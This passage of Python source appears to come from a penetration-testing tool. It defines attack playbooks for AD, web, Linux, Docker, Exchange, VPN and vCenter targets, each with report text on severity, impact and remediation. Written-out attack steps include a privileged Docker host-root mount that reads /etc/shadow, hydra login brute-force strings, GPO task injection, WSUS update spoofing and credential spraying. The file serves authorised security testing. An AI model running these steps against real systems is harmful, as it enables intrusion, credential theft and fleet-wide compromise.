                  recommendation="Patch and disable the Print Spooler service on servers/DCs "
                         "that don't need it; restrict Point-and-Print."),
            _step(4, "MS17-010 EternalBlue", "start", "netexec_module",
                  [], ["ms17_vuln"],
                  "nxc smb -M ms17-010: legacy SMBv1 RCE → SYSTEM.",
                  args={"protocol": "smb", "module": "ms17-010"},
                  severity="Critical", cvss="9.3",
                  finding_title="MS17-010 EternalBlue — SMBv1 RCE",
                  impact="Unauthenticated remote code execution as SYSTEM over SMBv1.",
                  recommendation="Patch MS17-010 and disable SMBv1 entirely."),
            _step(5, "Authentication coercion (PetitPotam / PrinterBug / DFSCoerce)", "start",
                  "netexec_module", [], ["coerced"],
                  "nxc smb -M coerce_plus: check whether the host can be coerced to "
                  "authenticate (feeds NTLM relay to an unsigned host or ADCS ESC8).",
                  "final", args={"protocol": "smb", "module": "coerce_plus"},
                  severity="High", cvss="8.1",
                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
                  impact="A DC/host can be coerced into authenticating to an arbitrary "
                         "target, feeding an NTLM relay to any unsigned host or ADCS ESC8.",
                  recommendation="Patch MS-RPRN/MS-EFSR/MS-DFSNM, disable the Print Spooler "
                         "on DCs, enforce SMB signing and channel binding, and disable NTLM."),
        ],
    },

    # ---- finding playbooks (detection + report content) ------------------
    _finding("smb-signing", "SMB Signing Not Enforced", "High", "6.5",
             "One or more hosts do not require SMB signing. Unsigned SMB allows "
             "an attacker who can capture or coerce NTLM authentication to relay "
             "it to these hosts.",
             "NTLM/SMB relay to the host can yield command execution or a "
             "credential/SAM dump, enabling lateral movement.",
             "Enforce SMB signing (Require) via GPO on all servers and "
             "workstations; disable NTLM where possible.",
             any_ports=[445], host_facts={"smb_signing": "False"},
             evidence_tools=["netexec_smb"]),
    _finding("smb-nullauth", "SMB Null / Anonymous Authentication Permitted",
             "Medium", "5.3",
             "The host accepts an anonymous (null) SMB session. The evidence "
             "shows what an unauthenticated attacker can enumerate over that "
             "session (e.g. shares) — confirming real, not just theoretical, exposure.",
             "Anonymous users can enumerate shares, and depending on configuration "
             "also users (RID cycling) and password policy — valuable recon and a "
             "starting point for further access.",
             "Restrict anonymous access (RestrictNullSessAccess=1, "
             "RestrictAnonymous=1); review share and RID enumeration exposure.",
             any_ports=[445], host_facts={"smb_nullauth": "True"},
             evidence_tools=["smbclient_shares", "netexec_smb"]),
    _finding("wsus-http", "WSUS Served Over HTTP", "High", "8.1",
             "A WSUS update service is reachable over cleartext HTTP (8530).",
             "If clients are not forced to use WSUS over SSL, an on-path attacker "
             "can spoof updates and execute code as SYSTEM on managed endpoints.",
             "Require WSUS over HTTPS (8531) and set the 'Do not store passwords'/"
             "SSL enforcement GPO for clients.",
             any_ports=[8530]),
    _finding("admin-console", "Administration Console Exposed", "Low", "4.0",
             "A management console / agent handler (e.g. endpoint-management "
             "platform) is network-reachable.",
             "If protected only by default or weak credentials, console access can "
             "push tasks/software to every managed endpoint.",
             "Restrict the console to management networks, enforce strong unique "
             "admin credentials and MFA, and patch to current.",
             any_ports=[8443, 8444]),
    _finding("rdp-exposed", "Remote Desktop (RDP) Exposed", "Low", "4.0",
             "RDP (3389) is reachable on the network.",
             "Credential brute-force / password-spray surface; legacy hosts may be "
             "vulnerable to pre-auth RCE (e.g. BlueKeep).",
             "Restrict RDP to jump hosts/VPN, require NLA, enforce account lockout, "
             "and keep hosts patched.",
             any_ports=[3389]),
    _finding("http-headers", "Missing HTTP Security Headers", "Low", "3.1",
             "Web responses omit recommended security headers (e.g. "
             "Content-Security-Policy, X-Frame-Options, HSTS).",
             "Increases exposure to clickjacking, MIME sniffing, and transport "
             "downgrade attacks.",
             "Add CSP, X-Frame-Options/frame-ancestors, X-Content-Type-Options, "
             "and Strict-Transport-Security.",
             any_ports=[80, 8080, 8000], evidence_tools=["http_probe"],
             detector="missing_http_headers"),
{
        "id": "web-injection",
        "name": "Web injection testing (SQLi / XSS / command injection)",
        "summary": "Discover hidden parameters, then run automated SQL-injection, "
                   "XSS and OS-command-injection testing; crack any dumped password "
                   "hashes and pivot recovered credentials into the network.",
        "match": {"any_ports": [80, 443, 8080, 8443, 8000], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Discover hidden request parameters", "start", "arjun",
                  [], ["api_endpoints"],
                  "arjun finds hidden GET/POST parameters on the URL — the inputs the "
                  "injection steps below actually test."),
            _step(2, "SQL injection (sqlmap)", "start", "sqlmap",
                  ["api_endpoints"], ["credential"],
                  "sqlmap --batch on the parameterised URL (add --data for POST): "
                  "confirms injectable parameters and can enumerate/dump the database "
                  "(--dbs, --dump) — dumped user hashes feed the cracking step.",
                  severity="High", cvss="8.6",
                  finding_title="SQL Injection in the Web Application",
                  impact="A parameter is SQL-injectable: an attacker can read or modify "
                         "the database (user credentials, business data) and, on stacked-"
                         "query configurations, execute OS commands (xp_cmdshell/--os-shell).",
                  recommendation="Use parameterised queries/prepared statements everywhere, "
                         "apply least-privilege DB accounts, disable xp_cmdshell, and add a "
                         "WAF rule set as defence in depth."),
            _step(3, "Cross-site scripting (dalfox)", "start", "dalfox",
                  ["api_endpoints"], ["exposure"],
                  "dalfox verifies reflected/DOM XSS on the discovered parameters with "
                  "a working proof-of-concept payload.",
                  severity="Medium", cvss="6.1",
                  finding_title="Reflected Cross-Site Scripting (XSS)",
                  impact="Reflected XSS lets an attacker run JavaScript in a victim's "
                         "session — session theft, credential harvesting and UI redress "
                         "against users of the application.",
                  recommendation="Context-encode all output, validate input, deploy a "
                         "Content-Security-Policy, and set HttpOnly/SameSite on cookies."),
            _step(4, "OS command injection (commix)", "start", "commix",
                  ["api_endpoints"], ["admin"],
                  "commix tests the parameters for OS command injection and can "
                  "establish a shell — the direct RCE class on a web app.",
                  severity="Critical", cvss="9.8",
                  finding_title="OS Command Injection in the Web Application",
                  impact="A parameter executes arbitrary operating-system commands with "
                         "the web service's privileges — full server compromise and a "
                         "foothold for lateral movement.",
                  recommendation="Never pass user input to shell commands; use safe APIs, "
                         "strict allow-list validation, and run the service as a low-"
                         "privileged, sandboxed account."),
            _step(5, "Crack any dumped password hashes", "have hashes", "crack_hashes",
                  ["hash"], ["credential"],
                  "Crack hashes recovered from the database dump offline, then pivot "
                  "them into netexec_spray across the estate.", "final"),
        ],
    },
{
        "id": "wordpress-attack",
        "name": "WordPress site compromise",
        "summary": "Fingerprint the WordPress install, enumerate vulnerable "
                   "plugins/themes and users, check known CVEs, and test the login "
                   "surface — the most common CMS attack path.",
        "match": {"any_ports": [80, 443, 8080, 8443], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Enumerate plugins / themes / users", "start", "wpscan",
                  [], ["userlist", "cve_hit"],
                  "wpscan -e vp,u: vulnerable plugins (with CVE references) and the "
                  "user list (feeds the login test).",
                  args={"enumerate": "vp,u"},
                  severity="High", cvss="7.5",
                  finding_title="Vulnerable WordPress Plugins / Themes",
                  impact="A vulnerable plugin or theme is remotely exploitable "
                         "(unauthenticated RCE / SQLi / file upload in known CVEs), "
                         "giving a foothold on the web server.",
                  recommendation="Update WordPress core, plugins and themes; remove "
                         "unused plugins; put the site behind a WAF; and block user "
                         "enumeration (author archives / REST API)."),
            _step(2, "Known exploited CVEs against the site", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve (tags cve,kev) matches the site against current "
                  "known-exploited WordPress/plugin CVE templates."),
            _step(3, "Test the login surface", "have userlist",
                  "hydra (service http-post-form against /wp-login.php — set the form "
                  "string 'log=^USER^&pwd=^PASS^')",
                  ["userlist"], ["credential"],
                  "Brute-force wp-login with the enumerated users and a small common "
                  "password list. Careful: online brute force is noisy and may lock "
                  "accounts — confirm the policy first.", "final"),
        ],
    },
{
        "id": "cve-web-check",
        "name": "Known-exploited web CVE sweep (KEV + recent criticals)",
        "summary": "Match every discovered web URL against Nuclei's CVE/KEV template "
                   "set — the actively exploited edge-device and application flaws "
                   "(Citrix Bleed, MOVEit, PAN-OS, Ivanti, ScreenConnect, ToolShell, "
                   "React2Shell, …) — then capture screenshot evidence and TLS issues.",
        "match": {"any_ports": [80, 443, 8080, 8443, 8000], "signals": []},
        "run": {},
        "steps": [
            _step(1, "CVE / KEV template sweep", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve -tags cve,kev: templates track the CISA Known Exploited "
                  "Vulnerabilities catalogue and recent critical disclosures; run "
                  "'nuclei -update-templates' regularly so the set stays current.",
                  severity="Critical", cvss="9.8",
                  finding_title="Known Exploited Vulnerability (CVE / CISA KEV) Present",
                  impact="The service matches a template for a vulnerability that is "
                         "actively exploited in the wild (CISA KEV) — internet-facing "
                         "instances are typically compromised within days of disclosure.",
                  recommendation="Patch or mitigate per the vendor advisory immediately, "
                         "hunt for signs of prior compromise (webshells, unknown accounts, "
                         "log gaps), and restrict management interfaces to trusted networks."),
            _step(2, "Screenshot the exposed interface", "start", "gowitness",
                  [], ["screenshot"],
                  "gowitness captures a PNG of the page for the report — evidence of "
                  "what is actually exposed (login portal, admin console, debug page)."),
            _step(3, "TLS configuration issues", "start", "testssl",
                  [], ["exposure"],
                  "testssl flags weak ciphers/protocols, expired certificates and TLS "
                  "vulnerabilities on HTTPS services.", "final",
                  severity="Low", cvss="3.7",
                  finding_title="Weak TLS Configuration",
                  impact="Weak TLS (obsolete protocols/ciphers, expired certificates) "
                         "enables downgrade and man-in-the-middle attacks against "
                         "credentials and session data in transit.",
                  recommendation="Disable TLS < 1.2 and weak cipher suites, renew and "
                         "properly scope certificates, and enable HSTS."),
        ],
    },
{
        "id": "linux-host",
        "name": "Linux host attack path (SSH → foothold → root)",
        "summary": "Audit the SSH surface, test credentials without lockout risk, then "
                   "escalate on the host: sudo/SUID/cron/kernel misconfigurations to root.",
        "match": {"any_ports": [22], "signals": []},
        "run": {},
        "steps": [
            _step(1, "SSH configuration audit", "start", "ssh_audit",
                  [], ["exposure"],
                  "ssh-audit reads the key-exchange, ciphers, MACs and auth policy: weak "
                  "algorithms, password auth enabled, and known CVEs (Terrapin, "
                  "regreSSHion class).",
                  severity="Low", cvss="3.7",
                  finding_title="Weak SSH Configuration",
                  impact="Weak SSH algorithms or password authentication increase "
                         "exposure to downgrade/man-in-the-middle attacks and online "
                         "credential guessing.",
                  recommendation="Disable weak KEX/ciphers/MACs, prefer key-only auth, "
                         "restrict users, and keep OpenSSH patched."),
            _step(2, "Credential testing over SSH", "start", "hydra",
                  ["userlist"], ["credential"],
                  "hydra ssh with a SMALL focused list (a handful of common/known "
                  "passwords, not a full brute force) — online guessing is noisy; check "
                  "lockout policy first. Intrusive-gated.",
                  args={"service": "ssh"},
                  severity="High", cvss="7.5",
                  finding_title="Weak SSH Credentials",
                  impact="A guessed or default SSH credential grants remote shell access "
                         "to the host — the starting point for privilege escalation to root.",
                  recommendation="Enforce key-only authentication, strong passphrases, "
                         "fail2ban/rate limiting, and remove default accounts."),
            _step(3, "On-host enumeration", "have credential",
                  "linpeas (upload + run via the SSH shell)", ["credential"], [],
                  "With a shell, run linpeas: SUID/SGID binaries (GTFOBins), sudo -l, "
                  "cron jobs, writable paths, capabilities, NFS no_root_squash, kernel "
                  "version vs known exploits (searchsploit)."),
            _step(4, "Escalate to root", "have credential",
                  "sudo / SUID / cron / kernel exploit (per linpeas output)",
                  ["credential"], ["admin", "flag"],
                  "Abuse the misconfiguration linpeas flagged: sudo rule, SUID binary, "
                  "writable cron/script, or a local kernel exploit for root.", "final"),
        ],
    },
{
        "id": "net-services",
        "name": "Exposed network services (SNMP / NFS / Redis / Docker / Elastic)",
        "summary": "Test the services that are frequently unauthenticated on internal "
                   "estates: SNMP communities, NFS exports, Redis, memcached, "
                   "Elasticsearch and the Docker API — each a direct data or RCE path.",
        "match": {"any_ports": [161, 111, 2049, 6379, 9200, 11211, 2375], "signals": []},
        "run": {},
        "steps": [
            _step(1, "SNMP community strings", "start", "onesixtyone",
                  [], ["exposure"],
                  "onesixtyone sweeps common community strings; 'public'/'private' "
                  "answering is the enabling misconfiguration."),
            _step(2, "SNMP data harvest", "start", "snmp_walk",
                  [], ["exposure", "credential"],
                  "snmpwalk with the discovered community reads device config, running "
                  "processes, users and sometimes credentials in plain text.",
                  severity="Medium", cvss="5.3",
                  finding_title="SNMP Readable with a Weak Community String",
                  impact="SNMP exposes device configuration, process/user lists and "
                         "occasionally credentials, and with a write community allows "
                         "device reconfiguration.",
                  recommendation="Use SNMPv3 (auth+privacy), change default communities, "
                         "restrict SNMP to monitoring hosts by ACL/firewall."),
            _step(3, "NFS exports", "start", "nfs_shares",
                  [], ["shares"],
                  "showmount -e lists exported filesystems; mountable exports leak "
                  "files (and with no_root_squash allow writing root-owned binaries).",
                  severity="Medium", cvss="6.5",
                  finding_title="NFS Export Accessible",
                  impact="A world- or network-readable NFS export exposes files "
                         "(configs, keys, backups); writable exports with no_root_squash "
                         "allow code execution as root on the server.",
                  recommendation="Restrict exports to specific hosts, enable root_squash, "
                         "and require Kerberos/ NFSv4 ACLs."),
            _step(4, "Redis unauthenticated access", "start", "redis_check",
                  [], ["exposure", "credential"],
                  "redis-cli info server answers without a password: the dataset is "
                  "readable/writable — session data, cached secrets, and RCE via rogue "
                  "module / SSH key / cron file writes.",
                  severity="High", cvss="7.5",
                  finding_title="Redis Exposed Without Authentication",
                  impact="An unauthenticated Redis instance leaks cached data and can be "
                         "turned into remote code execution on the host (module load, "
                         "authorized_keys/cron writes, master-replica abuse).",
                  recommendation="Require a strong requirepass/ACLs, bind to localhost or "
                         "protected VLANs, disable CONFIG/MODULE/DEBUG commands, and never "
                         "expose Redis to untrusted networks."),
            _step(5, "Elasticsearch unauthenticated access", "start", "elastic_check",
                  [], ["exposure"],
                  "curl /_cat/indices?v answers with the full index list without "
                  "authentication — every index is readable.",
                  severity="High", cvss="7.5",
                  finding_title="Elasticsearch Exposed Without Authentication",
                  impact="An open Elasticsearch cluster exposes all indexed data "
                         "(logs, user records, documents) and allows data modification "
                         "or deletion.",
                  recommendation="Enable X-Pack security (authentication + TLS), bind to "
                         "internal interfaces, and place behind an authenticated proxy."),
            _step(6, "Docker API exposed", "start", "docker_api_check",
                  [], ["exposure", "admin"],
                  "curl /version answers on 2375: the unauthenticated Docker API is "
                  "root-equivalent — run a privileged container mounting / to own the host.",
                  severity="Critical", cvss="9.8",
                  finding_title="Docker Daemon API Exposed (Unauthenticated)",
                  impact="Anyone who can reach the Docker API can start a privileged "
                         "container with the host filesystem mounted — immediate root on "
                         "the host and every container on it.",
                  recommendation="Never expose tcp/2375 unauthenticated; require TLS client "
                         "certificates (2376) or SSH-based access, and firewall the socket."),
            _step(7, "memcached unauthenticated access", "start", "memcached_check",
                  [], ["exposure"],
                  "nc stats answers: cached session/application data is readable; "
                  "also confirm it is not usable for UDP amplification.",
                  "final",
                  severity="Medium", cvss="5.3",
                  finding_title="memcached Exposed Without Authentication",
                  impact="Cached data (sessions, tokens, objects) is readable by anyone "
                         "on the network; exposed UDP memcached is abused for DDoS "
                         "amplification.",
                  recommendation="Bind memcached to localhost/internal interfaces, require "
                         "SASL auth where supported, and disable UDP (-U 0)."),
        ],
    },
{
        "id": "rdp-attack",
        "name": "RDP exposure → credential access",
        "summary": "Confirm RDP and its NLA posture, validate credentials (incl. "
                   "pass-the-hash), and test for weak credentials — RDP is the most "
                   "common ransomware entry vector.",
        "match": {"any_ports": [3389], "signals": []},
        "run": {},
        "steps": [
            _step(1, "RDP access and NLA check", "start", "netexec_rdp",
                  [], ["rdp_access", "admin"],
                  "nxc rdp: confirms the service and NLA requirement; with a credential "
                  "or NT hash it validates logon and local admin ('Pwn3d!')."),
            _step(2, "Weak credential test", "start", "hydra",
                  ["userlist"], ["credential"],
                  "hydra rdp with a SMALL common-password list — the classic ransomware "
                  "initial-access path. Intrusive-gated; check lockout policy first.",
                  args={"service": "rdp"},
                  severity="High", cvss="7.5",
                  finding_title="Weak RDP Credentials",
                  impact="A guessed RDP credential grants interactive remote access — "
                         "the most common ransomware entry vector; with local admin it "
                         "is full host compromise.",
                  recommendation="Disable RDP where unused, restrict to VPN/jump hosts, "
                         "require NLA + MFA (RD Gateway), enforce lockout, and alert on "
                         "failed logons."),
            _step(3, "Confirm admin access", "have credential", "netexec_rdp",
                  ["credential"], ["admin", "flag"],
                  "Re-authenticate with the recovered credential and look for 'Pwn3d!' — "
                  "local admin over RDP. Then pivot: secretsdump / DPAPI loot on the host.",
                  "final"),
        ],
    },
{
        "id": "gpo-abuse",
        "name": "Writable GPO → code execution on applied computers",
        "summary": "When your account can write a Group Policy Object, add an "
                   "immediate scheduled task — it runs as SYSTEM on every computer "
                   "the GPO applies to. The mass-execution path from one ACL.",
        "match": {"any_ports": [389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Collect the attack graph", "have credential", "bloodhound_python",
                  ["credential"], [],
                  "BloodHound collection exposes GenericWrite/WriteDACL/WriteOwner edges "
                  "from your account onto GPOs (and which OUs/computers they apply to)."),
            _step(2, "List writable objects (find GPOs)", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — identify GPOs you can modify; set the target "
                  "GPO's GUID as the gpo_id variable for the next step."),
            _step(3, "Abuse the GPO (immediate task)", "have credential", "pygpoabuse",
                  ["credential", "acl_write"], ["admin"],
                  "pygpoabuse adds an immediate scheduled task to the GPO — it executes "
                  "as SYSTEM on every computer in scope of the policy. Intrusive: it "
                  "modifies domain policy (clean up afterwards).",
                  severity="Critical", cvss="9.0",
                  finding_title="Writable Group Policy Object (Mass Code Execution Path)",
                  impact="Write access to a GPO allows pushing commands that run as "
                         "SYSTEM on every computer the policy applies to — one ACL "
                         "becomes fleet-wide compromise.",
                  recommendation="Restrict GPO modification to tier-0 admins, alert on "
                         "GPO changes (Event 5136/5137), and remove standing write ACEs "
                         "on GPOs."),
            _step(4, "Confirm execution", "have credential", "netexec_smb",
                  ["credential"], ["admin", "flag"],
                  "Authenticate to a computer the GPO applies to and verify (whoami "
                  "/groups; the task's output). Remove the injected task when done.",
                  "final", args={"command": "whoami"}),
        ],
    },
{
        "id": "exchange-attack",
        "name": "Exchange / OWA attack path",
        "summary": "Fingerprint the Exchange surface (OWA/EWS/Autodiscover), check it "
                   "against the heavily exploited Exchange CVE set, and test the OWA "
                   "login with recovered users.",
        "match": {"any_ports": [443], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Fingerprint OWA / EWS / Autodiscover", "start", "http_probe",
                  [], ["host_info"],
                  "http_probe the web root, /owa/, /ews/ and /Autodiscover/: Exchange "
                  "build numbers in headers and redirects pin the exact patch level. "
                  "(Uses the url variable — usually https://<host>/.)"),
            _step(2, "Exchange CVE sweep", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve matches ProxyLogon / ProxyShell / ProxyNotShell / OWASSRF "
                  "and other Exchange templates against the URL.",
                  severity="Critical", cvss="9.8",
                  finding_title="Exchange Server Vulnerable to a Known Exploit",
                  impact="An unpatched Exchange surface (ProxyLogon/ProxyShell class) "
                         "gives unauthenticated RCE as SYSTEM plus full mailbox access — "
                         "historically one of the most exploited enterprise flaws.",
                  recommendation="Apply the current Exchange CU/SU, enable AMSI, restrict "
                         "OWA/EWS to trusted networks or VPN, and hunt for webshells."),
            _step(3, "Version → exploit lookup", "start",
                  "searchsploit (query = the Exchange build from step 1)",
                  ["host_info"], ["cve_hit"],
                  "searchsploit the exact Exchange/CU build for exploits that have no "
                  "nuclei template."),
            _step(4, "OWA credential testing", "have userlist",
                  "hydra https-post-form against /owa/auth.owa (form string "
                  "'username=^USER^&password=^PASS^')",
                  ["userlist"], ["credential"],
                  "With the domain user list, test a SMALL set of common passwords on "
                  "the OWA form — a mailbox gives internal email access and frequently "
                  "VPN password reuse. Careful with lockout.", "final"),
        ],
    },
{
        "id": "container-attack",
        "name": "Exposed Docker API → host root (container escape)",
        "summary": "An unauthenticated Docker daemon API is root on the host: start a "
                   "privileged container with the host filesystem mounted, then loot "
                   "credentials and pivot.",
        "match": {"any_ports": [2375], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Confirm the exposed Docker API", "start", "docker_api_check",
                  [], ["exposure"],
                  "docker_api_check GET /version: a JSON answer = the daemon API is "
                  "unauthenticated.",
                  severity="Critical", cvss="9.8",
                  finding_title="Docker Daemon API Exposed (Unauthenticated)",
                  impact="The Docker API without TLS/auth is root-equivalent: run a "
                         "privileged container mounting / to read and write the host "
                         "and control every container on it.",
                  recommendation="Disable tcp/2375 or require TLS client certificates "
                         "(2376); bind the daemon to the unix socket; firewall "
                         "management interfaces."),
            _step(2, "Privileged container → host filesystem", "start",
                  "docker -H tcp://<target> run -v /:/host --privileged -it alpine chroot /host",
                  ["exposure"], ["admin"],
                  "From your machine with a docker client: mount / into a privileged "
                  "container and chroot — you are root on the host. Read /etc/shadow, "
                  "SSH keys, and cloud instance credentials."),
            _step(3, "Crack and pivot", "have hashes", "crack_hashes",
                  ["hash"], ["credential", "flag"],
                  "Crack /etc/shadow with john and pivot recovered credentials to SSH "
                  "and the domain (netexec_spray).", "final"),
        ],
    },
{
        "id": "vpn-gateway",
        "name": "IPsec VPN gateway (IKE aggressive-mode PSK)",
        "summary": "Enumerate the IKE gateway; if it answers aggressive mode, capture "
                   "the group PSK hash and crack it offline — the PSK plus a username "
                   "is VPN access.",
        "match": {"any_ports": [500], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Enumerate the IKE gateway", "start", "ike_scan",
                  [], ["host_info"],
                  "ike-scan -M: supported transforms, vendor ID, and whether "
                  "aggressive mode is offered."),
            _step(2, "Capture the aggressive-mode PSK hash", "start", "ike_scan",
                  [], ["hash"],
                  "ike_scan with mode=aggressive (set group=<vpn-group-id> when the "
                  "gateway expects one — often 'vpn' or the FQDN): the gateway answers "
                  "with the crackable PSK hash.",
                  args={"mode": "aggressive"},
                  severity="Medium", cvss="5.9",
                  finding_title="IPsec IKE Aggressive Mode with Pre-Shared Key",
                  impact="Aggressive mode exposes a crackable PSK hash; the cracked "
                         "group PSK plus any username grants VPN access, and group PSKs "
                         "are frequently weak and reused across sites.",
                  recommendation="Disable aggressive mode (main mode only), prefer "
                         "certificate authentication, and enforce strong unique PSKs."),
            _step(3, "Crack the PSK offline", "start",
                  "psk_crack (save the hash from step 2 to a file; hashcat -m 5300/5400 works too)",
                  ["hash"], ["credential"],
                  "Crack the captured PSK hash offline with psk-crack + rockyou — "
                  "success yields the group pre-shared key.", "final"),
        ],
    },
{
        "id": "wsus-attack",
        "name": "WSUS over HTTP → update spoofing",
        "summary": "Confirm a WSUS server distributing updates over cleartext HTTP, "
                   "then — from an on-path position, or with admin on the WSUS host — "
                   "inject a signed update that runs as SYSTEM on managed clients.",
        "match": {"any_ports": [8530], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Confirm WSUS over HTTP", "start", "wsus_check",
                  [], ["exposure"],
                  "wsus_check: the ClientWebService answering on :8530 confirms "
                  "cleartext update distribution.",
                  severity="High", cvss="8.1",
                  finding_title="WSUS Served Over HTTP",
                  impact="If clients are not forced to use SSL, an on-path attacker can "
                         "serve a malicious signed update that executes as SYSTEM on "
                         "every managed endpoint.",
                  recommendation="Require WSUS over HTTPS (8531) and enforce client-side "
                         "SSL via GPO; restrict the WSUS host to management networks."),
            _step(2, "On-path update injection", "start",
                  "PyWSUS / WSUSpendu from a MITM position (or SharpWSUS with admin on the WSUS host)",
                  ["exposure"], ["admin"],
                  "With network position (or WSUS admin), push an update wrapping a "
                  "Microsoft-signed binary (e.g. PsExec) with attacker arguments — it "
                  "runs as SYSTEM on the targeted clients.", "final"),
        ],
    },
{
        "id": "api-security",
        "name": "API attack surface: discovery → parameters → JWT → API CVEs",
        "summary": "Map the API surface (endpoints, hidden parameters, tokens), then "
                   "test for broken authorisation, JWT weaknesses and known API "
                   "exploits — modern apps expose more via API than via UI.",
        "match": {"any_ports": [80, 443, 3000, 5000, 8000, 8080, 8443, 8888],
                  "signals": []},
        "run": {},
        "steps": [
            _step(1, "Crawl for API endpoints", "start", "katana",
                  [], ["host_info"],
                  "katana (uses the url variable) crawls the app and its JavaScript "
                  "for /api, /v1..vN, /graphql, /swagger and /openapi.json routes — "
                  "the endpoint map every later step works from.",
                  severity="Medium", cvss="5.3",
                  finding_title="Unauthenticated API Endpoints Discovered",
                  impact="Reachable API routes — especially undocumented ones found in "
                         "JavaScript — frequently miss the authorisation checks applied "
                         "to the documented UI (BOLA/IDOR class).",
                  recommendation="Require authentication on every API route, publish a "
                         "complete OpenAPI spec so nothing stays undocumented, and "
                         "restrict /swagger and GraphQL introspection to developers."),
            _step(2, "Hidden parameter mining", "start", "arjun",
                  ["host_info"], ["host_info"],
                  "arjun (uses the url variable) brute-forces hidden query/body "
                  "parameters on the discovered routes — debug, admin, id and "
                  "internal parameters open IDOR and injection testing."),
            _step(3, "JWT analysis & attack", "start",
                  "jwt_tool <captured-jwt> (alg confusion, none alg, weak HMAC secret, kid injection)",
                  ["host_info"], ["credential"],
                  "Capture a JWT from login traffic, then offline: jwt_tool -T tampers "
                  "claims, -X a tries alg:none, -C -d rockyou.txt brute-forces weak "
                  "HMAC secrets — a forged token is usually an admin session. Check "
                  "kid/jku header injection too."),
            _step(4, "Known-exploit sweep", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve with tags cve,kev,api matches known API-framework and "
                  "gateway exploits against the URL.",
                  args={"tags": "cve,kev,api"},
                  severity="Critical", cvss="9.8",
                  finding_title="API Vulnerable to a Known Exploit",
                  impact="A known, often KEV-listed, exploit against the API stack "
                         "gives unauthenticated code execution or full data access "
                         "with a public proof of concept.",
                  recommendation="Patch the affected component, put the API behind a "
                         "positive-schema gateway/WAF, and alert on exploitation "
                         "patterns."),
        ],
    },
{
        "id": "hash-cracking",
        "name": "Captured hashes → identify → offline crack → reuse",
        "summary": "Any captured hash (NTLM, Kerberoast, AS-REP, VPN PSK, shadow) is "
                   "identified, cracked offline, and the recovered password sprayed "
                   "back at every reachable service.",
        "match": {"any_ports": [], "signals": ["nthash"]},
        "run": {},
        "steps": [
            _step(1, "Identify the hash type", "have hashes", "hashid",
                  ["hash"], ["host_info"],
                  "hashid on the captured hash file pins the algorithm (NTLM 1000, "
                  "AS-REP 18200, Kerberoast 13100, bcrypt, sha512crypt…) so the right "
                  "cracking mode is used."),
            _step(2, "Offline cracking", "have hashes", "crack_hashes",
                  ["hash"], ["credential"],
                  "crack_hashes runs john/hashcat with wordlist + rules against the "
                  "hash file — fully offline, zero lockout risk.",
                  severity="Medium", cvss="5.9",
                  finding_title="Passwords Recovered by Offline Hash Cracking",
                  impact="Captured hashes crack offline at the attacker's leisure; "
                         "recovered passwords are routinely reused across accounts, "
                         "VPN and SaaS — one weak password becomes lateral movement.",
                  recommendation="Enforce 14+ character passphrases, block "
                         "breached-password lists (Entra password protection / "
                         "haveibeenpwned), and use AES-only Kerberos encryption."),
            _step(3, "Targeted hashcat modes", "have hashes",
                  "hashcat -m 1000 (NTLM) / -m 18200 (AS-REP) / -m 13100 (Kerberoast) / -m 22000 (WPA) + rules",
                  ["hash"], ["credential"],
                  "For anything crack_hashes misses: pick the -m mode from step 1, "
                  "add OneRuleToRuleThemAll, then a mask attack for policy-shaped "
                  "passwords (SeasonYear! — e.g. Winter2026!)."),
            _step(4, "Spray recovered credentials", "have credential", "spray_cracked",
                  ["credential"], ["admin", "flag"],
                  "spray_cracked tests every recovered credential against SMB/WinRM "
                  "across the scope — password reuse turns one cracked hash into "
                  "lateral movement.", "final"),
        ],
    },
{
        "id": "virtualization-attack",
        "name": "vCenter / ESXi → hypervisor compromise → every guest VM",
        "summary": "Fingerprint the virtualization layer, hit vCenter/ESXi with their "
                   "known RCEs, then use hypervisor access to loot every guest — "
                   "including virtualised domain controllers.",
        "match": {"any_ports": [443, 902, 9443], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Fingerprint vCenter / ESXi", "start", "http_probe",
                  [], ["host_info"],
                  "http_probe the web root (uses the url variable): a vSphere "
                  "Client / IDENTITY_SERVICES redirect pins vCenter; ESXi answers on "
                  "443/902 with its own banner. Build numbers map to patch level."),
            _step(2, "Known-exploit sweep", "start", "nuclei_cve",
                  [], ["cve_hit"],
                  "nuclei_cve with tags cve,kev,vmware matches the vCenter/ESXi "
                  "heavy hitters: CVE-2021-21972 (unauth RCE), CVE-2024-37085 (ESXi "
                  "AD-join auth bypass), CVE-2023-34048 and successors.",
                  args={"tags": "cve,kev,vmware"},
                  severity="Critical", cvss="9.8",
                  finding_title="Virtualization Layer Vulnerable to a Known Exploit",
                  impact="vCenter RCE is SYSTEM on the management plane; ESXi "
                         "exploitation is control of every guest VM — including "
                         "domain controllers virtualised on the host. Full domain "
                         "compromise from one server.",
                  recommendation="Patch vCenter/ESXi to current, isolate management "
                         "interfaces to a jump-host VLAN, and audit the 'ESX Admins' "
                         "AD group (CVE-2024-37085 abuse)."),
            _step(3, "vCenter → domain dominance", "have credential",
                  "vpxd/SSO loot → datacenter enumeration → snapshot or console the DC VMs",
                  ["credential"], ["admin"],
                  "With any vCenter credential: enumerate datacenters, then snapshot "
                  "or open a remote console on the domain-controller VMs — offline "
                  "NTDS extraction from a snapshot never touches the live DC. Check "
                  "whether the AD group 'ESX Admins' exists: membership is ESXi root "
                  "on AD-joined hosts (CVE-2024-37085).", "final"),
        ],
    },
{
        "id": "backup-attack",
        "name": "Veeam backup server → stored credentials → domain",
        "summary": "Backup infrastructure stores credentials for everything it "
                   "protects. Identify Veeam, exploit its known RCEs, and recover the "
                   "stored job credentials — routinely vCenter and domain admin.",
        "match": {"any_ports": [443, 445, 1433, 9401, 9443], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Identify the backup server", "start", "http_probe",
                  [], ["host_info"],
                  "http_probe (uses the url variable): Veeam Backup Enterprise "
